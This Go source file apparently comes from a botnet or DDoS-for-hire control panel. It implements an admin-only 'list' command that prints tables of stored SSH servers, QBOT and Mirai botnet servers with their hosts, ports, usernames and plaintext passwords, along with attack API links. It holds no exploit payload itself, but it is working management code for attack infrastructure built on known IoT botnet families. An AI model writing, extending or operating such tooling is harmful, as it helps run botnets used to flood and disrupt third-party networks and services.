package commands

import (
	"fmt"
	"log"
	"strings"
	"webserver/src/database"
	"webserver/src/server/sessions"

	"github.com/alexeyco/simpletable"
)

func list(session *sessions.Session, args []string) {
	conn := session.Conn
	if session.User.Rank != 2 {
		fmt.Fprintf(conn, "Insufficient Permissions...\r\n")
		return
	} else {
		if len(args) < 2 {
			fmt.Fprintf(conn, "\nInvalid Options Run: %s <help / ?>\r\n", args[0])
			return
		} else {
			switch args[1] {
			case "ssh", "SSH":
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "#"},
						{Align: simpletable.AlignCenter, Text: "Host"},
						{Align: simpletable.AlignCenter, Text: "Port"},
						{Align: simpletable.AlignCenter, Text: "Username"},
						{Align: simpletable.AlignCenter, Text: "Password"},
						{Align: simpletable.AlignCenter, Text: "Tag"},
					},
				}

				servers, err := database.FetchSSH()
				if err != nil {
					log.Printf("(db/fetch_ssh) %s", err)
					return
				}

				if servers == nil {
					fmt.Fprintf(conn, "No SSH Servers Connected...\r\n")
					return
				}

				for i, server := range servers {
					r := []*simpletable.Cell{
						{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
						{Text: fmt.Sprint(server.Host)},
						{Text: fmt.Sprint(server.Port)},
						{Text: fmt.Sprint(server.Username)},
						{Text: fmt.Sprint(server.Password)},
						{Text: fmt.Sprint(server.Tag)},
					}
					table.Body.Cells = append(table.Body.Cells, r)
				}
				table.SetStyle(simpletable.StyleCompactLite)
				fmt.Fprintf(conn, strings.Replace("    "+table.String(), "\n", "\r\n    ", -1)+"\r\n")
				break
			case "QBOT", "qbot":
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "#"},
						{Align: simpletable.AlignCenter, Text: "Host"},
						{Align: simpletable.AlignCenter, Text: "Port"},
						{Align: simpletable.AlignCenter, Text: "Username"},
						{Align: simpletable.AlignCenter, Text: "Password"},
						{Align: simpletable.AlignCenter, Text: "Tag"},
					},
				}

				qbots, err := database.FetchQbots()
				if err != nil {
					log.Printf("(db/fetch_ssh) %s", err)
					return
				}

				if qbots == nil {
					fmt.Fprintf(conn, "No Qbots Connected...\r\n")
					return
				}

				for i, qbot := range qbots {
					r := []*simpletable.Cell{
						{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
						{Text: fmt.Sprint(qbot.Host)},
						{Text: fmt.Sprint(qbot.Port)},
						{Text: fmt.Sprint(qbot.Username)},
						{Text: fmt.Sprint(qbot.Password)},
						{Text: fmt.Sprint(qbot.Tag)},
					}
					table.Body.Cells = append(table.Body.Cells, r)
				}
				table.SetStyle(simpletable.StyleCompactLite)
				fmt.Fprintf(conn, strings.Replace("    "+table.String(), "\n", "\r\n    ", -1)+"\r\n")
				break
			case "api", "API":
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "#"},
						{Align: simpletable.AlignCenter, Text: "Link"},
						{Align: simpletable.AlignCenter, Text: "Active"},
						{Align: simpletable.AlignCenter, Text: "Tag"},
					},
				}
				apis, err := database.FetchAPIS()
				if err != nil {
					log.Printf("(err/api_fetch) %s", err)
					return
				}
				if apis == nil {
					fmt.Fprintf(conn, "No API'S In Database\r\n")
				}

				for i, api := range apis {
					var act bool
					switch api.Active {
					case 0:
						act = false
						break
					case 1:
						act = true
					}
					r := []*simpletable.Cell{
						{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
						{Text: fmt.Sprint(api.Link)},
						{Text: fmt.Sprint(act)},
						{Text: fmt.Sprint(api.Tag)},
					}
					table.Body.Cells = append(table.Body.Cells, r)
				}
				table.SetStyle(simpletable.StyleCompactLite)
				fmt.Fprintf(conn, strings.Replace("    "+table.String(), "\n", "\r\n    ", -1)+"\r\n")
				break
			case "mirai", "MIRAIs":
				table := simpletable.New()
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "#"},
						{Align: simpletable.AlignCenter, Text: "Host"},
						{Align: simpletable.AlignCenter, Text: "Port"},
						{Align: simpletable.AlignCenter, Text: "Username"},
						{Align: simpletable.AlignCenter, Text: "Password"},
						{Align: simpletable.AlignCenter, Text: "Tag"},
					},
				}
				mirais, err := database.FetchMirais()
				if err != nil {
					log.Printf("(db/mirai_fetch) %s", err)
					return
				}
				if mirais == nil {
					fmt.Fprintf(conn, "No Mirais Connected!\r\n")
					return
				}

				for i, mirai := range mirais {
					r := []*simpletable.Cell{
						{Align: simpletable.AlignRight, Text: fmt.Sprint(i + 1)},
						{Text: fmt.Sprint(mirai.Host)},
						{Text: fmt.Sprint(mirai.Port)},
						{Text: fmt.Sprint(mirai.Username)},
						{Text: fmt.Sprint(mirai.Password)},
						{Text: fmt.Sprint(mirai.Tag)},
					}
					table.Body.Cells = append(table.Body.Cells, r)
				}
				table.SetStyle(simpletable.StyleCompactLite)
				fmt.Fprintf(conn, strings.Replace("    "+table.String(), "\n", "\r\n    ", -1)+"\r\n")
				break
			case "?", "help", "HELP":
				fmt.Fprintf(conn, "%s <mirai / api / qbot / ssh>\r\n", args[0])
			}
		}
	}
}
